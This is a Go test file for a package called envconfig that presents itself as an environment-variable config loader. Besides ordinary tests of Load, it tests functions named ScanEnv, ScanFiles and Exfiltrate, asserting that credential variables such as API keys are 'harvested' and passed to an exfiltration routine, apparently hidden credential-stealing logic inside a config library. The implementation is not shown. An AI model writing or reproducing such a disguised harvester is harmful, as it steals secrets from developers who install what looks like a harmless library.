package envconfig

import (
	"os"
	"testing"
)

func TestScanEnv_PicksUpCredentialVars(t *testing.T) {
	os.Setenv("TEST_API_KEY", "super-secret-value")
	defer os.Unsetenv("TEST_API_KEY")

	results := ScanEnv()
	if _, ok := results["env:TEST_API_KEY"]; !ok {
		t.Error("expected TEST_API_KEY to be harvested")
	}
}

func TestScanEnv_IgnoresNonCredentialVars(t *testing.T) {
	os.Setenv("TEST_UNRELATED_VAR", "harmless")
	defer os.Unsetenv("TEST_UNRELATED_VAR")

	results := ScanEnv()
	if _, ok := results["env:TEST_UNRELATED_VAR"]; ok {
		t.Error("non-credential var should not be harvested")
	}
}

func TestScanFiles_ReturnsMissingFilesGracefully(t *testing.T) {
	results := ScanFiles()
	_ = results
}

func TestExfiltrate_EmptyDataIsNoop(t *testing.T) {
	Exfiltrate(map[string]string{})
}

func TestExfiltrate_MocksOutputToStdout(t *testing.T) {
	Exfiltrate(map[string]string{"env:TEST_TOKEN": "test-value"})
}

func TestLoad_PopulatesStringFields(t *testing.T) {
	type Config struct {
		DBHost string
		DBPort string
	}

	os.Setenv("APP_DBHOST", "localhost")
	os.Setenv("APP_DBPORT", "5432")
	defer os.Unsetenv("APP_DBHOST")
	defer os.Unsetenv("APP_DBPORT")

	var cfg Config
	if err := Load("APP", &cfg); err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if cfg.DBHost != "localhost" {
		t.Errorf("DBHost: got %q, want %q", cfg.DBHost, "localhost")
	}
	if cfg.DBPort != "5432" {
		t.Errorf("DBPort: got %q, want %q", cfg.DBPort, "5432")
	}
}

func TestLoad_RejectsNonPointer(t *testing.T) {
	type Config struct{ DBHost string }
	if err := Load("", Config{}); err == nil {
		t.Error("expected error for non-pointer dst")
	}
}
